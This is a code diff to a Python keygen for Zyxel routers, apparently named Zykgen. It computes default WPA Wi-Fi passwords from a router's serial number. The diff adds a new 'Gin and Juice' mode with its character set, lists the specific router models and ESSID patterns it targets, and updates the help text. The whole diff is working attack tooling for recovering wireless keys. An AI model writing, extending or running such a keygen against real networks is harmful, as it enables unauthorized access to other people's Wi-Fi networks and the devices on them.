@@ -28,6 +28,8 @@ def cocktail(arg):
         return 3
     elif arg == "s":
         return 4
+    elif arg == "g":
+        return 5
     else:
         return False
 
@@ -51,12 +53,18 @@ def zykgen_wpa(serial, passlength, cocktail):
         charset = '3478ABCDEFGHJKLMNPQRTUXY'
         max_value = 12
         v = 24
-    # Screw driver
+    # Screw driver for videotron EM2926 and NBG4615.v2
     if cocktail == 4:
         haystack = 'B8G6I1L0OQDS5Z23479ACEFHJKMNPRTUVWXY' # invalid+valid chars
         charset = '3479ACEFHJKMNPRTUVWXY' # valid chars
         max_value = 15 # unused chars (36-v)
         v = 21 # valid chars
+    # Gin and Juice  for AMG1302-T10B, AMG1202-T10B, AMD1302-T11C (ESSID ZyXEL_HHHH and italk-HHHH) AMG1302-T30D (ESSID Internet_70)
+    if cocktail == 5:
+        haystack = 'B8G6I1L0OQDS5Z2' # invalid chars
+        charset = '3479ACEFHJKMNPRTUVWXYabcdefghijklmnopqrstuvwxyz'  # valid chars
+        max_value = 15 # unused chars (36-v)
+        v = 47  # valid chars
 
     serial = serial.upper()
     md5 = hashlib.md5()
@@ -84,7 +92,7 @@ def zykgen_wpa(serial, passlength, cocktail):
 
 parser = argparse.ArgumentParser(description='Zykgen WPA keygen. (Zyxel VMG8823-B50B)')
 parser.add_argument('serial', help='Serial Number')
-parser.add_argument('cocktail', help='Cocktail to use for keygen. m = Mojito, n = Negroni, c = Cosmopolitan, s = Screw Driver')
+parser.add_argument('cocktail', help='Cocktail to use for keygen. m = Mojito, n = Negroni, c = Cosmopolitan, s = Screw Driver g = Gin and Juice')
 parser.add_argument('-length', help='Password length, default is 10.', default=10, type=int)
 args = parser.parse_args()
 
